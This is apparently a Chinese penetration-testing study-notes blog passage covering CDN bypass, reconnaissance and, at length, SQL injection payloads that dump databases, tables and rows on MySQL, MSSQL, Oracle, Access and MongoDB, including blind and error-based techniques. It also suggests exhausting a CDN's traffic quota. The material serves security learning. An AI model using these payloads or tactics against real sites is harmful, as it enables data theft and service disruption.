<li>常见第三方平台或软件漏洞类型及攻击 – 弱口令</li>
<li>简要第三方平台或软件安全测试的范围</li>
</ul>
<h2 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h2><h3 id="常见加密编码等算法解析"><a href="#常见加密编码等算法解析" class="headerlink" title="常见加密编码等算法解析"></a>常见加密编码等算法解析</h3><ul>
<li>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES 等</li>
</ul>
<h3 id="常见加密形式算法解析"><a href="#常见加密形式算法解析" class="headerlink" title="常见加密形式算法解析"></a>常见加密形式算法解析</h3><ul>
<li>直接加密，带 salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</li>
</ul>
<h3 id="常见解密方式"><a href="#常见解密方式" class="headerlink" title="常见解密方式"></a>常见解密方式</h3><ul>
<li>枚举，自定义逆向算法，可逆向</li>
</ul>
<h3 id="了解常规加密算法的特性"><a href="#了解常规加密算法的特性" class="headerlink" title="了解常规加密算法的特性"></a>了解常规加密算法的特性</h3><ul>
<li>长度位数，字符规律，代码分析，搜索获取等</li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h2><p>CDN的全称是（Content Delivery Network）,即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p>
<p><img src="/img/3.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="判断是否存在CDN"><a href="#判断是否存在CDN" class="headerlink" title="判断是否存在CDN"></a>判断是否存在CDN</h3><p>通过使用<strong>Ping</strong>服务对目标域名进行请求，查看是否存在多个<strong>IP</strong>节点，从而对有无<strong>CDN</strong>服务进行判断</p>
<p><strong>nslookup</strong> 域名，看是否会有很多节点</p>
<h3 id="CDN对测试有何影响-amp-如何绕过"><a href="#CDN对测试有何影响-amp-如何绕过" class="headerlink" title="CDN对测试有何影响&amp;如何绕过"></a>CDN对测试有何影响&amp;如何绕过</h3><ol>
<li>子域名查询：有的网站主域名会做CDN，但是子域名可能不会做</li>
<li>邮件服务查询：我们访问别人，可能通过CDN，但别人访问我们通常不会走CDN</li>
<li>国外地址请求：国外没有CDN节点的话，可能直接走原ip</li>
<li>遗留文件，扫描全网</li>
<li>黑暗引擎搜索特定文件</li>
<li>dns历史记录，以量打量：CDN节点是有流量上限的，用光之后就会直通原机，这也是一种流量攻击</li>
</ol>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="子域名上的技巧"><a href="#子域名上的技巧" class="headerlink" title="子域名上的技巧"></a>子域名上的技巧</h4><ul>
<li><p>二级域名和三级域名查到的结果可能不一样</p>
</li>
<li><p>主域名和子域名查询到的可能不一样</p>
</li>
<li><p>DNS历史记录&#x3D;第三方接口(接口查询)</p>
</li>
<li><p>采集&#x2F;国外请求( 同类型访问)</p>
</li>
<li><p>邮件源码测试对比第三方查询(地区分析)</p>
</li>
<li><p>黑暗引擎(shodan搜指定hash文件)</p>
</li>
<li><p>扫全网 fuckcdn，w8 fuckcdn，zmap等</p>
</li>
<li><p>工具扫描</p>
</li>
<li><p>认为判定，根据网站的域名备案推测</p>
</li>
<li><p>本地清下dns，然后hosts里写上得到的ip和域名，如果是cdn可能会出现刷新异常，如果打开很快大概率是原机</p>
</li>
</ul>
<h2 id="架构，搭建，WAF"><a href="#架构，搭建，WAF" class="headerlink" title="架构，搭建，WAF"></a>架构，搭建，WAF</h2><h3 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h3><ul>
<li>搭建习惯-目录型站点</li>
<li>搭建习惯-端口类站点</li>
<li>搭建习惯-子域名站点</li>
<li>搭建习惯-类似域名站点</li>
<li>搭建习惯-旁注, c段站点</li>
<li>搭建习惯-搭建软件特征站点</li>
</ul>
<h3 id="WAF防护分析"><a href="#WAF防护分析" class="headerlink" title="WAF防护分析"></a>WAF防护分析</h3><ul>
<li>什么是WAF应用? –  Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。</li>
<li>如何快速识别WAF?</li>
<li>识别WAF对于安全测试的意义?</li>
</ul>
<h2 id="APP及其他资产"><a href="#APP及其他资产" class="headerlink" title="APP及其他资产"></a>APP及其他资产</h2><blockquote>
<p>在安全测试中，若WEB无法取得进展或无WEB的情况下，我们需要借助APP或其他资产在进行信息收集,从而开展后续渗透</p>
</blockquote>
<h3 id="APE提取一键反编译提取"><a href="#APE提取一键反编译提取" class="headerlink" title="APE提取一键反编译提取"></a>APE提取一键反编译提取</h3><ul>
<li>使用反编译工具，尝试获取包了里的源码</li>
</ul>
<h3 id="APP抓数据包进行工具配合"><a href="#APP抓数据包进行工具配合" class="headerlink" title="APP抓数据包进行工具配合"></a>APP抓数据包进行工具配合</h3><ul>
<li>使用burp suite设置代理（http、https协议），或者wireshark抓数据包（所有协议），进行分析</li>
</ul>
<h3 id="各种第三方应用相关探针技术"><a href="#各种第三方应用相关探针技术" class="headerlink" title="各种第三方应用相关探针技术"></a>各种第三方应用相关探针技术</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a></li>
<li><a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a></li>
</ul>
<h2 id="资产监控"><a href="#资产监控" class="headerlink" title="资产监控"></a>资产监控</h2><p>Github监控 — 便于收集整理最新exp或poc — 便于发现相关测试目标的资产</p>
<p>各种子域名查询 DNS,备案,证书 — 全球节点请求cdn</p>
<p>枚举爆破或解析子域名对应 — 便于发现管理员相关的注册信息</p>
<p>黑暗引擎相关搜索 — fofa，shodan, zoomeye</p>
<img src="/img/4.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />


<h1 id="二、相关WEB漏洞"><a href="#二、相关WEB漏洞" class="headerlink" title="二、相关WEB漏洞"></a>二、相关WEB漏洞</h1><img src="/img/5.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" />

<p><strong>在PHP 中遍历一个文件夹下所有文件和子文件夹的方法</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">my_dir</span>(<span class="hljs-params"><span class="hljs-variable">$dir</span></span>) </span>&#123;<br> <span class="hljs-variable">$files</span> = [];<br> <span class="hljs-keyword">if</span>(@<span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$dir</span>)) &#123;<br>  <span class="hljs-keyword">while</span>((<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$handle</span>)) !== <span class="hljs-literal">false</span>) &#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;..&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;.&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span> . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-variable">$file</span>)) &#123; <span class="hljs-comment">//如果是子文件夹，进行递归</span><br>     <span class="hljs-variable">$files</span>[<span class="hljs-variable">$file</span>] = <span class="hljs-title function_ invoke__">my_dir</span>(<span class="hljs-variable">$dir</span> . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-variable">$file</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-variable">$files</span>[] = <span class="hljs-variable">$file</span>;<br>    &#125;<br>   &#125;<br>  &#125;<br>        <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$handle</span>);<br>    &#125;<br> <span class="hljs-keyword">return</span> <span class="hljs-variable">$files</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">my_dir</span>(<span class="hljs-string">&quot;./&quot;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>如果报错：PHP Parse error:  syntax error, unexpected ‘[‘ in &#x2F;usercode&#x2F;file.php on line 4  切换php版本5.4及以上</p>
<p>扩展<br>1.POC(Proof ofConcept)，中文意思是“观点证明”。这个短语会在漏洞报告中使用，漏洞报告中的POC则是一段说明或者一个攻击的样例，使得读者能够确认这个漏洞是真实存在的。</p>
<p>2.EXP(Exploit)，中文意思是“漏洞利用”。意思是一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得读者完全了解漏洞的机理以及利用的方法。</p>
<p>3.VUL(Vulnerability)，泛指漏洞。</p>
<p>4.CVE漏洞编号,CVE 的英文全称是“Common Vulnerabilities &amp; Exposures”公共漏洞和暴露，例如CVE-2015-0057、CVE-1999-0001等等。CVE就好像是一个字典表，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。如果在一个漏洞报告中指明的一个漏洞，如果有CVE名称，你就可以快速地在任何其它CVE兼容的数据库中找到相应修补的信息，解决安全问题。<br>可以在<a target="_blank" rel="noopener" href="https://cve.mitre.org/%E7%BD%91%E7%AB%99%E6%A0%B9%E6%8D%AE%E6%BC%8F%E6%B4%9E%E7%9A%84CVE%E7%BC%96%E5%8F%B7%E6%90%9C%E7%B4%A2%E8%AF%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D%E3%80%82">https://cve.mitre.org/网站根据漏洞的CVE编号搜索该漏洞的介绍。</a><br>也可以在中文社区<a target="_blank" rel="noopener" href="http://www.scap.org.cn/%E4%B8%8A%E6%90%9C%E7%B4%A2%E5%85%B3%E4%BA%8E%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D">http://www.scap.org.cn/上搜索关于漏洞的介绍</a></p>
<p>5.0DAY漏洞和0DAY攻击<br>在计算机领域中，零日漏洞或零时差漏洞（英语：Zero-dayexploit）通常是指还没有补丁的安全漏洞，而零日攻击或零时差攻击（英语：Zero-dayattack）则是指利用这种漏洞进行的攻击。提供该漏洞细节或者利用程序的人通常是该漏洞的发现者。零日漏洞的利用程序对网络安全具有巨大威胁。</p>
</blockquote>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>sql注入就是在数据交互中，前端数据传到后台时没有做严格的判断，导致传进来的数据被拼接到sql语句中，被当作sql语句的一部分进行执行，从而导致数据泄露，丢失甚至服务器瘫痪。如果代码中没有过滤或者过滤不严谨是会出现漏洞的。</p>
<p><img src="/img/6.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="注入时信息收集"><a href="#注入时信息收集" class="headerlink" title="注入时信息收集"></a>注入时信息收集</h3><img src="/img/7.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" />



<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><blockquote>
<p>当发现网站页面中存在输入框，并且在url地址中存在<code>?_=</code>的情况猜测输入框的输入值是否可以构成注入点存在，或者url地址参数值的设置是否可以成为注入点。当网站页面会对测试代码作出反应时，可以判断存在反应的地方存在注入点。下一步对具体注入语句进行判断。</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">判断注入<br><span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 正常<br><span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2 错误<br>可能存在注入，其实归根结底就是看输入会不会对网站造成影响，即操作有效<br></code></pre></td></tr></table></figure>

<h4 id="order-by默认是升序"><a href="#order-by默认是升序" class="headerlink" title="order by默认是升序"></a>order by默认是升序</h4><ul>
<li>在mysql5.0以上版本存在一个 <code>information_schema</code>的数据库，它记录着所有的数据库，表明，列名。</li>
<li>数据库中“.”代表下级</li>
<li><code>select * information_schema.tables;</code>记录所有表名</li>
<li><code>where table_name=&#39;&#39;</code>筛选条件</li>
<li><code>select * from information_schema.columns;</code>记录所有的列名</li>
<li><code>where column_name=&#39;&#39;</code>筛选条件</li>
<li><code>wherw table_schema=&#39;&#39;</code>筛选条件</li>
</ul>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><ul>
<li>判断数据个数order by x 根据正确域错误的格式来判断个数，然后select 1,2,3,…</li>
<li>查询数据库 version()</li>
<li>数据库名字 database()</li>
<li>数据库用户 user()</li>
<li>操作系统 @@version_compile_os</li>
</ul>
<h3 id="MySql注入"><a href="#MySql注入" class="headerlink" title="MySql注入"></a>MySql注入</h3><p>可以根据相关Sqllabs学习笔记</p>
<blockquote>
<p><strong>在真实SQL注入安全测试中，我们一定要先明确提交数据及提交方法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取,后续安全测试中我们也必须满足同等的操作才能进行注入</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">#简要明确参数类型<br>数字，字符，搜索，<span class="hljs-type">JSON</span>等<br>数字可以直接加在<span class="hljs-keyword">sql</span>中<br>字符就要通过单双引号接入<span class="hljs-keyword">sql</span>语句中<br><br>#简要明确请求方法<br><span class="hljs-keyword">GET</span>, POST, COOKIE, REQUEST, HTTP头等<br><br>其中SQI语句干扰符号:  <span class="hljs-string">&#x27;, &quot;, %, ), &#125; 等，具体需看写法</span><br><span class="hljs-string">&#x27;</span>&quot;]&#125;)可以作为默认测试写法<br></code></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http">Json数据格式：<br>curl -X POST https:*//api.zoomeye.org/user/login -d*<br>&#123;<br> &quot;username&quot;: &quot;foo@bar.com&quot;,<br> &quot;password&quot;: &quot;foobar&quot;<br>&#125;<br>Json数据包中，注入的测试语句要写在冒号后面。其中Json的双引号不需要闭合，SQL语句中的单引号或者双引号需要闭合<br><br>a=1 and 1=1&amp;b=2&amp;c=3<br><br>&#123;<br> &quot;a&quot;: &quot;1 and 1=1&quot;<br> &quot;b&quot;: &quot;2&quot;<br> &quot;c&quot;: &quot;3&quot;<br>&#125;<br></code></pre></td></tr></table></figure>
</blockquote>
<h3 id="SQL注入之Oracle、MongoDB等注入"><a href="#SQL注入之Oracle、MongoDB等注入" class="headerlink" title="SQL注入之Oracle、MongoDB等注入"></a>SQL注入之Oracle、MongoDB等注入</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">简要学习各种数据库的注入特点<br><span class="hljs-keyword">Access</span>, mysql ,mssql(<span class="hljs-keyword">sql</span> <span class="hljs-keyword">server</span>) mongoDB, postgresql, sqlite,oracle, sybase等<br><span class="hljs-keyword">Access</span>数据库放在网站下<br><br>数据库架构组成，数据库高权限操作<br><br>简要学习各种注入工具的使用指南<br>熟悉工具的支持库，注入模式，优缺点等<br>Sqlmap, NoSQLAttack, Pangolin等<br><span class="hljs-keyword">access</span>结构<br>					表名<br>								列名<br>											数据<br>mysql、mssql等<br>				数据库A<br>										表名<br>															列名<br>																				数据<br>				数据库B<br>										。。。<br>															。。。<br>																				。。。<br></code></pre></td></tr></table></figure>



<h4 id="Access注入测试"><a href="#Access注入测试" class="headerlink" title="Access注入测试"></a>Access注入测试</h4><p>在Access中没有数据库没有在后端而是直接放在网站下，所以可以直接查数据：</p>
<p><code>union select 1,username,passwd from admin</code></p>
<h4 id="Sql-Server"><a href="#Sql-Server" class="headerlink" title="Sql Server"></a>Sql Server</h4><ul>
<li><p>判断数据库类型</p>
<ul>
<li><code>and exists (select * from sysobjects)--返回正常为mssql（也名sql server）</code></li>
<li><code>and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个</code></li>
</ul>
</li>
<li><p>通过<code>order by</code>对注入的语句进行判断，在构造注入语句</p>
<ul>
<li><code>id=-1 union all select null,null,null,null</code></li>
</ul>
</li>
<li><p>对有回显的注入点进行判断</p>
<ul>
<li><code>id=-1 union all select null,1,null,null</code></li>
</ul>
</li>
<li><p>判断数据库版本</p>
<ul>
<li><code>and 1=@@version-- / id = -1 union all select null,@@version,null,null 在有回显的版本下</code></li>
<li><code>and substring((select @@version),22,4)=&#39;2008&#39;-- 适用于无回显模式，后面的2008就是数据库版本，返回正常就是2008的复制代码第一条语句执行</code></li>
</ul>
</li>
<li><p>获取所有数据库的个数 (以下3条语句可供选择使用)</p>
<ul>
<li><p><code>and 1=(select quotename(count(name)) from master..sysdatabases)--</code></p>
<p><code>id=-1 union all select null,(select quotename(count(name)) from master..sysdatabases),null,null</code></p>
</li>
<li><p><code>and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --</code></p>
</li>
<li><p><code>and 1=(select str(count(name))%2b&#39;|&#39; from master..sysdatabases where dbid&gt;5) --</code></p>
<p><code>and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;5) --</code></p>
<blockquote>
<p>说明：dbid从1-4的数据库一般为系统数据库.</p>
</blockquote>
</li>
</ul>
</li>
<li><p>获取数据库 （该语句是一次性获取全部数据库的，且语句只适合&gt;&#x3D;2005，两条语句可供选择使用）</p>
<ul>
<li><p><code>and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(&#39;&#39;))--</code></p>
<p><code>id=-1 union all select null,(select quotename(name) from master..sysdatabases FOR XML PATH(&#39;&#39;)),null,null</code></p>
</li>
<li><p><code> and 1=(select &#39;|&#39;%2bname%2b&#39;|&#39; from master..sysdatabases FOR XML PATH(&#39;&#39;))--</code></p>
</li>
</ul>
</li>
<li><p>获取当前数据库</p>
<ul>
<li><p><code>and db_name()&gt;0</code></p>
</li>
<li><p><code>and 1=(select db_name())--</code></p>
<p><code>id=-1 union all select null,(select db_name()),null,null</code></p>
</li>
</ul>
</li>
<li><p>获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】</p>
<ul>
<li><p><code>and 1=(select quotename(name) from 数据库名..sysobjects where xtype=&#39;U&#39; FOR XML PATH(&#39;&#39;))-- </code></p>
<p><code>id=-1 union all select null,(select quotename(name) from 数据库名..sysobjects where xtype=&#39;U&#39; FOR XML PATH(&#39;&#39;)),null,null</code></p>
</li>
<li><p><code>and 1=(select &#39;|&#39;%2bname%2b&#39;|&#39; from 数据库名..sysobjects where xtype=&#39;U&#39; FOR XML PATH(&#39;&#39;))--</code></p>
</li>
</ul>
</li>
<li><p>获得表里的列【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】</p>
<ul>
<li><p><code>and 1=(select quotename(name) from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=&#39;指定表名&#39;) FOR XML PATH(&#39;&#39;))--</code></p>
<p><code>id=-1 union all select null,(select quotename(name) from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=&#39;指定表名&#39;) FOR XML PATH(&#39;&#39;)),null,null</code></p>
</li>
<li><p><code>and 1=(select &#39;|&#39;%2bname%2b&#39;|&#39; from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=&#39;指定表名&#39;) FOR XML PATH(&#39;&#39;))--</code></p>
</li>
</ul>
</li>
<li><p>获取指定数据库中的表的列的数据库【逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）】</p>
<ul>
<li><p><code> and 1=(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(&#39;&#39;))--</code></p>
<p><code>id=-1 union all select null,(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(&#39;&#39;)),null,null</code></p>
</li>
</ul>
<p>【一次性爆N条所有字段的数据（只限于mssql2005及以上版本）】</p>
<ul>
<li><code>and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(&#39;&#39;))--</code></li>
</ul>
</li>
</ul>
<h4 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h4><ul>
<li>在Oracle数据库中判断注入点之后，通过下列语句判断是否有回显：<ul>
<li><code>?id=-1 union select &#39;1&#39;,&#39;2&#39; from dual</code></li>
</ul>
</li>
<li>接下来查询表名：<code>select table_name from all_tables where rownum=1 and table_name like &#39;表名中存在的字符串&#39;</code><ul>
<li><code>?id=-1 union select (select table_name from all_tables where rownum=1 and table_name like &#39;表名中存在的字符串&#39;),&#39;null&#39; from dual</code></li>
</ul>
</li>
<li>获取表中列名：<code>select column_name from all_tab_columns where rownum=1 and table_name=&#39;表名&#39;)</code><ul>
<li><code>?id=-1 union select select column_name from all_tab_columns where rownum=1 and table_name=&#39;表名&#39;),&#39;null&#39; from dual</code></li>
</ul>
</li>
</ul>
<h4 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h4><p>在MongoDB数据库中进行条件查询时与Mysql中不同的是：Mysql是用where，但是在MongoDB中是通过键值形式进行查询</p>
<ul>
<li>所以在构造注入语句的时候要对键值的形式进行闭合：<ul>
<li><code>?id=1&#39;&#125;); return (&#123;title:1,content:&#39;2</code></li>
</ul>
</li>
<li>在通过源码判断回显之后将注入语句进行注入获得想要结果：<ul>
<li>（爆库）<code>id=1&#39;&#125;); return (&#123;title:tojson(db),content:&#39;1</code></li>
<li>（爆表）<code>id=1&#39;&#125;); return (&#123;title:tojson(db.getCollectionNames()),content:&#39;1</code></li>
<li>（爆字段）<code>id=1&#39;&#125;); return (&#123;title:tojson(db.&#39;使用的表名&#39;.find()[0]),content:&#39;1</code></li>
</ul>
</li>
</ul>
<h3 id="SQL注入中的查询方式及盲注（报错、延时、布尔逻辑）"><a href="#SQL注入中的查询方式及盲注（报错、延时、布尔逻辑）" class="headerlink" title="SQL注入中的查询方式及盲注（报错、延时、布尔逻辑）"></a>SQL注入中的查询方式及盲注（报错、延时、布尔逻辑）</h3><blockquote>
<p><strong>当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致,这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句。</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span>查询数据<br>在网站应用中进行数据显示查询操作<br>例: <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$id<br><br><span class="hljs-keyword">insert</span>插入数据<br>在网站应用中进行用户注册添加等操作<br>例: <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> news (id, url, text) <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;$t&#x27;</span>)<br><br><span class="hljs-keyword">delete</span>删除数据<br>后台管理里面删除文章删除用户等操作<br>例: <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$id<br><br><span class="hljs-keyword">update</span>更新数据<br>会员或后台中心数据同步或缓存等操作<br>例: <span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> pwd<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$p&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">and</span> username<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br><br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>排序数据<br>一般结合表名或列名进行数据排序操作<br>例: <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $id<br>例: <span class="hljs-keyword">select</span> id, name, price <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $<span class="hljs-keyword">order</span><br><br>重点理解:<br>我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用猜测到对方的<span class="hljs-keyword">SQL</span>查询方式<br><br><span class="hljs-keyword">SQL</span>注入报错盲注<br>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类:<br><br>基于布尔的<span class="hljs-keyword">SQL</span>盲注<span class="hljs-operator">-</span>逻辑判断<br>regexp, <span class="hljs-keyword">like</span>, ascii, <span class="hljs-keyword">left</span>, ord, mid<br><br>基于时间的<span class="hljs-keyword">SQL</span>盲注<span class="hljs-operator">-</span>延时判断<br>if, sleep<br><br>基于报错的<span class="hljs-keyword">SQL</span>盲注<span class="hljs-operator">-</span>报错回显<br>floor, updatexml，extractvalue<br></code></pre></td></tr></table></figure>



<h4 id="基于布尔sql盲注：利用逻辑判断"><a href="#基于布尔sql盲注：利用逻辑判断" class="headerlink" title="基于布尔sql盲注：利用逻辑判断"></a>基于布尔sql盲注：利用逻辑判断</h4><ul>
<li><p><code>mid(column_name,start,length)</code></p>
<p><code>mid</code>函数从<code>start</code>位置截取<code>column_name</code>的<code>length</code>位</p>
</li>
<li><p><code>substr(string,start,length)</code></p>
<p><code>substr</code>函数以<code>start</code>为开始位置截取<code>length</code>的长度</p>
</li>
<li><p><code>left(string,n)</code></p>
<p><code>left</code>函数将<code>string</code>字符串截前<code>n</code>位</p>
</li>
<li><p><code>ord()与ascii()</code>将字符转换为<code>ascii</code>值</p>
</li>
<li><p><code>regexp</code>正则注入 <code>regexp&#39;^str&#39;</code> 在<code>regexp</code>正则注入中可以取所匹配中的内容，故只要包含都可以匹配到。</p>
<p>用法演示：<code>select user() regexp&#39;^sh&#39;</code></p>
</li>
<li><p><code>like</code>匹配注入</p>
<p>用法演示：<code>select user() like &#39;sh%&#39;</code></p>
</li>
</ul>
<h4 id="基于报错的sql盲注——构造payload让信息通过错误提示回显"><a href="#基于报错的sql盲注——构造payload让信息通过错误提示回显" class="headerlink" title="基于报错的sql盲注——构造payload让信息通过错误提示回显"></a><strong>基于报错的sql盲注——构造payload让信息通过错误提示回显</strong></h4><p>1.<code>union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a</code></p>
<p>大致原理为分组后数据计数时重复造成的错误</p>
<p>可简化：<code>union select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</code></p>
<p>若关键表被禁用：<code>union select count(*) from (select 1 union selecy null union select !1) group by concat(version(),floor(rand(0)*2))</code></p>
<p>如果<code>rand</code>被禁用：<code>union select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</code></p>
<p>2.<code>union select exp(~(select * from(select user())a))</code></p>
<p><code>double</code>数值类型超出范围，<code>exp()</code>是以e为底的函数，版本在5.5.5及以上</p>
<p>3.<code>union select !(select * from (select user())x) - ~0</code></p>
